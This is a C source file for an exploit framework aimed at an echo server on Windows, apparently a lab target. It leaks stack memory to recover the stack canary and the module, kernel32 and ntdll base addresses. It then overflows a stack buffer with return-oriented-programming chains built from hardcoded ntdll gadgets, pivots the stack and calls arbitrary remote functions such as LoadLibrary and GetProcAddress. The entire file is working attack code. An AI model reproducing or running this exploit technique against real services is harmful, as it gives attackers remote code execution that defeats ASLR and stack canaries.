#include <string.h>
#include <assert.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdbool.h>

#include "injector.h"
#include "connection.h"

// ====================================================================================
// Target specific constants.
// ------------------------------------------------------------------------------------

// Offset from buffer to canary.
#define OFFSET_CANARY 0x200

// Offset from buffer to return address.
#define OFFSET_RET_ADDRESS 0x218

// Offset from buffer to stack leak, where stack address is located.
#define OFFSET_STACK_LEAK 0x1f8

// Offset from buffer to leaked stack address.
#define OFFSET_STACK_LEAK_TARGET 0x228

// Offset from buffer to return address to kernel32.
#define OFFSET_KERNEL32_RET 0x458

// Offset from buffer to return address to ntdll.
#define OFFSET_NTDLL_RET 0x488

// Expected storage size for output data.
#define EXPECTED_OUT_STORAGE_SIZE 0x200

// We have to leak enough to read up to return address to ntdll + expected storage size.
#define FIRST_LEAK_SIZE (OFFSET_NTDLL_RET + 0x8 + EXPECTED_OUT_STORAGE_SIZE)

// Distance in bytes from server's module base to Echo's return address.
#define DISTANCE_MODULE_BASE 0x6f80

// Distance in bytes from kernel32 base to kernel32 return address leaked from stack.
#define DISTANCE_KERNEL32_BASE 0x13dc4

// Distance in bytes from ntdll base to ntdll return address leaked from stack.
#define DISTANCE_NTDLL_BASE 0x73691


// ====================================================================================
// Module and procedure address caching subsystem.
// ------------------------------------------------------------------------------------

/* remote_LoadLibrary and remote_GetProcAddress make use of a simple caching system,
 * implemented here below. Module handles and procedure addresses are stored in plain
 * arrays, and they are indexed by module name and procedure name, respectively.
 *
 * Notice that procedures with the same name in different modules will be considered
 * the same by the caching system.
 *
 */
#define MOD_ARRAY_CAPACITY 64
#define PRC_ARRAY_CAPACITY 1024
 
static uint64_t mod_count = 0;
static uint64_t prc_count = 0;

static char* arr_mod_name[MOD_ARRAY_CAPACITY];
static char* arr_prc_name[PRC_ARRAY_CAPACITY];

static uint64_t arr_mod[MOD_ARRAY_CAPACITY];
static uint64_t arr_prc[PRC_ARRAY_CAPACITY];

static uint64_t find_module_in_cache(char *module_name) {
    for (uint64_t k = 0; k < mod_count; k++) {
        if (strcmp(module_name, arr_mod_name[k]) == 0)
            return arr_mod[k];            
    }
    return 0;
}

static uint64_t find_procedure_in_cache(char *procedure_name) {
    for (uint64_t k = 0; k < prc_count; k++) {
        if (strcmp(procedure_name, arr_prc_name[k]) == 0)
            return arr_prc[k];            
    }
    return 0;
}

static void cache_module(char *module_name, uint64_t module_handle) {
    arr_mod_name[mod_count] = module_name;
    arr_mod[mod_count] = module_handle;
    mod_count++;
}

static void cache_procedure(char *procedure_name, uint64_t address) {
    arr_prc_name[prc_count] = procedure_name;
    arr_prc[prc_count] = address;
    prc_count++;
}


// ====================================================================================
// ROP CRP compilation and injection system for echo server target.
// ------------------------------------------------------------------------------------
/*
 * This is the subsystem in charge of injecting CRPs into the target process. How this
 * is done is target dependant, as appropriate vulnerabilities will need to be exploited 
 * to inject the CRP, to bootstrap it, and then to retrieve output data.
 *
 */

/* The next three constants are there just to simplify some procedures, but prologue,
 * code and epilogue are all defined in the remote_call function. An assert is used,
 * however, to make sure that lengths do match before injecting any CRP.
 *
 */

#define PROLOGUE_SIZE 0x10
#define STD_CODE_SIZE 0x108
#define EPILOGUE_SIZE 0x40

/* This injector supports calling remote procedures with at most 12 arguments.
 * This is just an arbitrary decision, it would not be any more difficult to
 * handle calls with more arguments.
 *
 */
#define MAX_ARG_COUNT 12

/* The next response_buffer is where memory dumped from the target host will be stored.
 *
 */
#define RESPONSE_BUFFER_LENGTH 65355

static uint8_t response_buffer[RESPONSE_BUFFER_LENGTH];


// ====================================================================================
// Injector's private procedures.
// ====================================================================================

typedef struct _target_address_space_info_t {
    uint64_t buffer_base;
    uint64_t main_module_base;
    uint64_t ntdll_base;
    uint64_t kernel32_base;
    uint64_t frame_canary;
} target_address_space_info_t;

static target_address_space_info_t space;

// ------------------------------------------------------------------------------------
// leak_stack

static int32_t leak_stack(uint16_t leak_length) {
    int32_t ret = 0;

    ZeroMemory((void*)response_buffer, RESPONSE_BUFFER_LENGTH);

    printf("[*] (leak_stack) Performing information leak.\n");

    printf("[*] (leak_stack) Establishing connection with target.\n");
    if ((ret = establish_connection()) < 0) {
        return ret;
    }

    printf("[*] (leak_stack) Attempting to leak 0x%x bytes.\n", leak_length);
    if ((ret = send_message((uint8_t*)&leak_length, sizeof(uint16_t))) < 0) {
        return ret;
    }

    printf("[*] (leak_stack) Shutting down write to force leak.\n");
    if ((ret = shutdown_write()) < 0) {
        return ret;
    };

    printf("[*] (leak_stack) Attempting to read 0x%x bytes from response.\n", leak_length);
    if ((ret = read_response((uint8_t*)response_buffer, leak_length)) < 0) {
        return -WSAGetLastError();
    }

    printf("[*] (leak_stack) Read 0x%x bytes, now closing connection.\n", ret);
    if ((ret = close_connection()) < 0) {
        return -WSAGetLastError();
    }

    return 0;
}

// ------------------------------------------------------------------------------------
// compute_addresses

static int32_t compute_addresses() {
    int32_t ret;

    if ((ret = leak_stack(FIRST_LEAK_SIZE)) < 0) {
        return ret;
    }

    uint8_t *out = (uint8_t*)response_buffer;

    // Grab an address in the stack to compute buffer's start address.
    space.buffer_base = *(uint64_t*)(out + OFFSET_STACK_LEAK) - OFFSET_STACK_LEAK_TARGET;

    // Grab stack canary to avoid stack smashing protection.
    space.frame_canary = *(uint64_t*)(out + OFFSET_CANARY);

    // Grab return address to get an address in server's .text section.
    space.main_module_base = *(uint64_t*)(out + OFFSET_RET_ADDRESS) - DISTANCE_MODULE_BASE;

    // Grab kernel32.BaseThreadInitThunk+14 and compute kernel32 base address.
    space.kernel32_base = *(uint64_t*)(out + OFFSET_KERNEL32_RET) - DISTANCE_KERNEL32_BASE;

    // Grab ntdll.RtlUserThreadStart+21 and compute ntdll base address.
    space.ntdll_base = *(uint64_t*)(out + OFFSET_NTDLL_RET) - DISTANCE_NTDLL_BASE;

    printf("[*] ...... \n");
    printf("[*] ...... Buffer base address   : 0x%llx\n", space.buffer_base);
    printf("[*] ...... Stack canary          : 0x%llx\n", space.frame_canary);
    printf("[*] ...... Module base address   : 0x%llx\n", space.main_module_base);
    printf("[*] ...... kernel32 base address : 0x%llx\n", space.kernel32_base);
    printf("[*] ...... ntdll base address    : 0x%llx\n", space.ntdll_base);
    printf("[-] \n");
    
    if (space.frame_canary == 0) {
        printf("[x] Failed to leak addresses properly; sometimes it happens, try restarting the server.\n");
        printf("[-] \n");
        return -1;
    }

    return 0;
}

// ------------------------------------------------------------------------------------
// resolve_internal_offsets

static void resolve_internal_offsets(uint8_t *crp_buffer, uint64_t len, uint64_t crp_base_address) {
    uint64_t *crp = (uint64_t*)crp_buffer;

    for (uint64_t i = 0; i < len/sizeof(uint64_t); i++) {
        uint64_t x = crp[i];

        uint32_t x_lo = (uint32_t)x;
        uint32_t x_hi = (uint32_t)(x >> 32);

        if (x_hi == LABEL_REFERENCE) {
            for (uint64_t j = 0; j < len/sizeof(uint64_t); j++) {
                uint64_t y = crp[j];

                uint32_t y_lo = (uint32_t)y;
                uint32_t y_hi = (uint32_t)(y >> 32);

                if (y_hi == LABEL_TARGET && y_lo == x_lo) {
                    crp[i] = crp_base_address + (j + 1)*sizeof(uint64_t);
                    break;
                }
            }
        }
    }
}

// ------------------------------------------------------------------------------------
// send_injection_message

static int32_t send_injection_message(uint8_t *buffer, uint64_t len) {
    int32_t ret;

    printf("[*] (send_injection_message) Injecting CRP into target process.\n");

    printf("[*] (send_injection_message) Establishing connection with target to attempt injection.\n");
    if ((ret = establish_connection()) < 0) {
        return ret;
    }

    printf("[*] (send_injection_message) Sending message length.\n", len);
    if ((ret = send_message((uint8_t*)&len, sizeof(uint16_t))) < 0) {
        return ret;
    }

    printf("[*] (send_injection_message) Sending 0x%x byte message, attempting to inject CRP.\n", len);
    if ((ret = send_message(buffer, len)) < 0) {
        return ret;
    }

    printf("[*] (send_injection_message) Closing connection.\n");
    if ((ret = close_connection()) < 0) {
        return -WSAGetLastError();
    }


    return 0;
}

// ------------------------------------------------------------------------------------
// round_to_multiple

static uint32_t round_to_multiple(uint32_t value, uint32_t of) {
    return (value + (of - 1)) & ~(of - 1);
}

// ------------------------------------------------------------------------------------
// make_single_byte_array_data

static uint8_t *make_single_byte_array_data(uint8_t *bytes, uint64_t bytes_len) {
    uint64_t *data = (uint64_t*)malloc(bytes_len + 8);
    data[0] = MAKE_TARGET(1);
    memcpy((uint8_t*)&data[1], bytes, bytes_len);
    return (uint8_t*)data;
}


// ====================================================================================
// Injector's public interface.
// ====================================================================================

// ------------------------------------------------------------------------------------
// initialize_injector

int32_t initialize_injector() {
    printf("[*] (initialize_injector) Initializing injector.\n");
    return compute_addresses();
}

// ------------------------------------------------------------------------------------
// make_single_string_data

uint8_t *make_single_string_data(char *string, uint64_t *out_data_size) {
    *out_data_size = 8 + round_to_multiple(strlen(string) + 1, 8);
    return make_single_byte_array_data((uint8_t*)string, *out_data_size - 8);
}

// ------------------------------------------------------------------------------------
// make_single_wstring_data

uint8_t *make_single_wstring_data(wchar_t *string, uint64_t *out_data_size) {
    *out_data_size = 8 + round_to_multiple(2*wcslen(string) + 2, 8);
    return make_single_byte_array_data((uint8_t*)string, *out_data_size - 8);
}

// ------------------------------------------------------------------------------------
// get_out_storage_base

uint64_t get_out_storage_base() {
    /* For this injector, data should be written well below in the stack where it
     * will not be overwritten by other function calls, but it will be still
     * retrievable through the buffer overread.
     *
     */
    return space.buffer_base + OFFSET_NTDLL_RET + 8;
}

// ------------------------------------------------------------------------------------
// get_out_storage_size

uint64_t get_out_storage_size() {
    /*
     * This injector stores data after the last return address in the stack.
     * The space left there actually varies from execution to execution,
     * so the constante EXPECTED_OUT_STORAGE_SIZE should be reasonably small
     * to stay within the bounds of the region.
     *
     * In any case, when initializing the injector, if it is not possible to
     * leak up to the last expected storage address (maybe because it is
     * not mapped), initialization will fail. In such case, restarting the
     * target server will probably be enough to solve the problem.
     *
     */
    return EXPECTED_OUT_STORAGE_SIZE;
}

// ------------------------------------------------------------------------------------
// get_max_input_data_size

uint64_t get_max_input_data_size() {
    return OFFSET_CANARY - STD_CODE_SIZE - EPILOGUE_SIZE;
}

// ------------------------------------------------------------------------------------
// remote_LoadLibrary

int32_t remote_LoadLibrary(char *lib_name, uint64_t *r_lib_handle) {
    uint64_t cached;
    
    if ((cached = find_module_in_cache(lib_name)) > 0) {
        *r_lib_handle = cached;
        return 0;
    }
    
    printf("[*] (remote_LoadLibraryA) remote_LoadLibraryA(\"%s\").\n", lib_name);
    
    int32_t ret;
    
    /* 
     * Create data section, just a single string and a label.
     */
    uint64_t data_size;
    uint8_t *data = make_single_string_data(lib_name, &data_size);
    
    uint8_t *out;
    
    if ((ret = remote_call(
            space.kernel32_base + 0x1e4a0, // &LoadLibrary
            data,
            data_size,
            &out,
            /*
             * Argument count and arguments for remote LoadLibrary call.
             * Just a reference to be handled by the label replacement
             * mechanism, to point to address of MAKE_TARGET(1) + 8 in
             * data section (generated by make_single_string_data).
             *
             */
            1,
            MAKE_REFERENCE(1))) < 0) {
                
        return ret;
    };
    
    *r_lib_handle = *(uint64_t*)out;
    
    cache_module(lib_name, *r_lib_handle);
    
    printf("[*] (remote_LoadLibrary) Found library base address to be 0x%llx\n", *r_lib_handle);
    
    free(data);
    return 0;
}

// ------------------------------------------------------------------------------------
// remote_GetProcAddress

int32_t remote_GetProcAddress(uint64_t h_lib, char *proc_name, uint64_t *r_proc_addr) {
    uint64_t cached;
    
    if ((cached = find_procedure_in_cache(proc_name)) > 0) {
        *r_proc_addr = cached;
        return 0;
    }
    
    printf("[*] (remote_GetProcAddress) remote_GetProcAddress(0x%llx, \"%s\").\n",  h_lib, proc_name);
    
    int32_t ret;
    
    /* Create data section, just a single string and a label.
     * 
     */
    uint64_t data_size;
    uint8_t *data = make_single_string_data(proc_name, &data_size);
    
    uint8_t *out;
    
    if ((ret = remote_call(
            space.kernel32_base + 0x19500, // &GetProcAddress
            data,
            data_size,
            &out,
            /* 
             * Argument count and arguments for GetProcAddress.
             */
            2,
            h_lib,
            MAKE_REFERENCE(1))) < 0) {
                
        return ret;
    };
    
    *r_proc_addr = *(uint64_t*)out;
    
    cache_procedure(proc_name, *r_proc_addr);
    
    printf("[*] (remote_GetProcAddress) Found procedure address to be 0x%llx.\n", *r_proc_addr);
    
    free(data);
    return 0;
}

// ------------------------------------------------------------------------------------
// remote_find_and_call

int32_t remote_find_and_call(
        char *lib_name,
        char *proc_name,
        uint8_t *data,
        uint64_t data_len,
        uint8_t **out,
        uint8_t argc,
        ...) {
        
    uint64_t r_module;
    uint64_t r_proc;
    
    int32_t ret;
    
    /* Find procedure in target's address space.
     *
     */
    if ((ret = remote_LoadLibrary(lib_name, &r_module)) < 0) {
        return ret;
    }
    if ((ret = remote_GetProcAddress(r_module, proc_name, &r_proc)) < 0) {
        return ret;
    }
    
    /* Do inject CRP.
     *
     */
    va_list varargs;
    va_start(varargs, argc);
    
    ret = _remote_call(r_proc, data, data_len, out, argc, varargs);
    
    va_end(varargs);
    return ret;
}

// ------------------------------------------------------------------------------------
// remote_call



int32_t remote_call(
        int64_t r_proc_addr,
        uint8_t *data,
        uint64_t data_len,
        uint8_t **out,
        uint8_t argc,
        ...) {
            
    va_list varargs;
    va_start(varargs, argc);
    
    int32_t ret = _remote_call(r_proc_addr, data, data_len, out, argc, varargs);
    
    va_end(varargs);
    return ret;
}

// ------------------------------------------------------------------------------------
// _remote_call

static int32_t _remote_call(
        int64_t r_proc_addr,
        uint8_t *data,
        uint64_t data_len,
        uint8_t **out,
        uint8_t argc,
        va_list varargs) {

    int32_t ret;

    /* Define a CRP prologue that will prepare the code segment for execution.
     * In this case, it's just a pivot inside the stack.
     *
     */
    uint64_t crp_prologue[] = {
        space.ntdll_base + 0x46f44, // pop rsp ; and al, 0x10 ; ret
        space.buffer_base
    };
    
    assert(sizeof(crp_prologue) == PROLOGUE_SIZE);
    
    /* Organize arguments for remote procedure.
     *
     */
    uint64_t args[MAX_ARG_COUNT]; ZeroMemory((void*)args, sizeof(args));
    
    for (int i = 0; i < argc; i++) {
        args[i] = va_arg(varargs, uint64_t);
    }
    
    /* Define generic CRP code.
     *
     */
    uint64_t crp_code[] = {
        
        /* Load args[0] into rcx.
         * 
         */
        space.ntdll_base + 0x8d94d,     // pop rcx; ret
        args[0],
        
        /* Load args[1] into rdx.
         *
         */
        space.ntdll_base + 0x2810,      // pop rax; ret
        get_out_storage_base(),
        space.ntdll_base + 0x7a882,     // pop rdx; add al, byte ptr ds:[rax]; ret
        args[1],
        
        /* Load args[2] and args[3] into r8 and r9, respectively.
         *
         */
        space.ntdll_base + 0x8b3c2,     // pop r8; pop r9; pop r10; pop r11; ret
        args[2],
        args[3],
        0,
        0,
        
        /* Actual address of the function to be called, with a nop gadget before.
         * The nop gadget is for the argument block to be 16 byte aligned;
         * otherwise, the payload may crash on unaligned xmm accesses.
         *
         */
        space.ntdll_base + 0x9135f,     // nop; ret
        r_proc_addr,
        
        /* Additional arguments and a gadget to skip over them.
         *
         */
        space.ntdll_base + 0x268f,      // add rsp, 0x68; ret; 
        0,
        0,
        0,
        0,
        args[ 4],
        args[ 5],
        args[ 6],
        args[ 7],
        args[ 8],
        args[ 9],
        args[10],
        args[11],
        0,
        
        /* Save rax to first 8 bytes of output storage.
         *
         */
        space.ntdll_base + 0x8b3c2,     // pop r8; pop r9; pop r10; pop r11; ret
        get_out_storage_base(),
        0,
        0,
        0,
        space.ntdll_base + 0x862bb      // mov qword ptr [r8], rax; ret
    };
    
    assert(sizeof(crp_code) == STD_CODE_SIZE);

    /* Define an epilogue that will return execution flow right to
     * normal after CRP concludes. Concretely, this epilogue will first 
     * restore the original return address and then the stack pointer.
     *
     */
    uint64_t crp_epilogue[] = {

        // Restore original return address.
        space.ntdll_base + 0x8b3c2, // pop r8; pop r9; pop r10; pop r11; ret;
        space.buffer_base + OFFSET_RET_ADDRESS - 8,
        space.main_module_base + DISTANCE_MODULE_BASE,
        0,
        0,
        space.ntdll_base + 0x816a2, // mov qword ptr [r8 + 8], r9; ret;

        // Restore stack pointer.
        space.ntdll_base + 0x46f44, // pop rsp ; and al, 0x10 ; ret
        space.buffer_base + OFFSET_RET_ADDRESS

    };

    assert(sizeof(crp_epilogue) == EPILOGUE_SIZE);

    /* Define a buffer to hold the data that will be sent to the target process.
     * It has enough data to fill the target buffer up to the return address,
     * and then 16 additional bytes to inject the CRP's prologue to bootstrap
     * the procedure after the target function returns.
     *
     */
    uint8_t injection_buffer[OFFSET_RET_ADDRESS + sizeof(crp_prologue)];

    /* Compute the length of the whole block of code, epilogue and data. The whole CRP
     * should fit before the canary.
     *
     */
    uint64_t crp_len = sizeof(crp_code) + sizeof(crp_epilogue) + data_len;

    if (crp_len > OFFSET_CANARY) {
        return -1; // CRP will not fit and program will crash.
    }

    /* Clean injection buffer's memory and copy CRP data into it.
     *
     */
    ZeroMemory(injection_buffer, sizeof(injection_buffer));

    uint64_t count = 0;
    
    uint8_t* p_buff = (uint8_t*)injection_buffer;

    memcpy(p_buff + count, (void*)crp_code, sizeof(crp_code));
    count += sizeof(crp_code);

    memcpy(p_buff + count, (void*)crp_epilogue, sizeof(crp_epilogue));
    count += sizeof(crp_epilogue);

    memcpy(p_buff + count, data, data_len);
    count += data_len;

    resolve_internal_offsets(p_buff, count, space.buffer_base);

    // Set canary into injection buffer.
    *(uint64_t*)(p_buff + OFFSET_CANARY) = space.frame_canary;

    // Copy epilogue to injection buffer.
    uint8_t *prologue_start = p_buff + sizeof(injection_buffer) - sizeof(crp_prologue);
    memcpy(prologue_start, crp_prologue, sizeof(crp_prologue));

    if (ret = send_injection_message(p_buff, sizeof(injection_buffer)) < 0) {
        printf("[x] (_remote_call) Failed inject CRP, error code %x.\n", ret);
        return ret;
    }
    if (out == 0) {
        return 0;
    }

    /* Leak everything up to the end of the out storage section, as to retrieve data
     * set by the code reuse procedure.
     *
     */
    if ((ret = leak_stack(FIRST_LEAK_SIZE)) < 0) {
        return ret;
    }

    /* Set data out pointer to point to the out data section as retrieved by read primitive.
     * This allows caller to obtain out data from the remote procedure call.
     *
     */
    *out = (uint8_t*)response_buffer + FIRST_LEAK_SIZE - EXPECTED_OUT_STORAGE_SIZE;
    return 0;
}
